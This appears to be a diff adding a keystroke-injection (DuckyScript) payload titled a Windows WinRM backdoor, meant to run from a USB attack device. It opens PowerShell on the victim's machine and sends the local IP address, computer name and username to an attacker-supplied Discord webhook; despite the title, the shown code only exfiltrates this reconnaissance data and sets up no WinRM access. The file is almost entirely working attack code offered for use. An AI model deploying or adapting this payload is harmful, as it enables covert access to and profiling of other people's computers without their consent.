@@ -1,0 +1,26 @@
+REM #
+REM # Title:            "Microsoft Windows" WinRM Backdoor
+REM #
+REM # Description:      
+REM #                   1) Sends IP adress to discord webhook
+REM #
+REM # Author:           LuKres
+REM # Version:          1.0
+REM # Category:         Remote Access
+REM # Target:           Microsoft Windows
+REM #
+REM # TESTED ON
+REM # ===============
+REM # Microsoft Windows 10 Family Version 20H2 (PowerShell 5.1)
+REM # Microsoft Windows 10 Professional Version 20H2 (PowerShell 5.1)
+REM #
+
+REM ######## INITIALIZATION ########
+
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+STRING $WebhookUrl = !!!PASTE_WEBHOOK_HERE!!!; $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch '^(Loopback|isatap|[vV]Ethernet)$' -and $_.PrefixOrigin -ne 'WellKnown' -and $_.SuffixOrigin -ne 'LinkLocal' -and $_.Type -ne 'Tunnel' } | Sort-Object -Property InterfaceIndex | Select-Object -First 1).IPAddress; $hostname = $env:COMPUTERNAME; $username = $env:USERNAME; $body = ConvertTo-Json -Depth 2 -Compress -InputObject @{content = "# :fire: New log!`n*Local IP address is:* $ip`n*Computer name is:* $hostname`n*Username is:* $username"}; Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $body -ContentType 'application/json'; exit
+ENTER
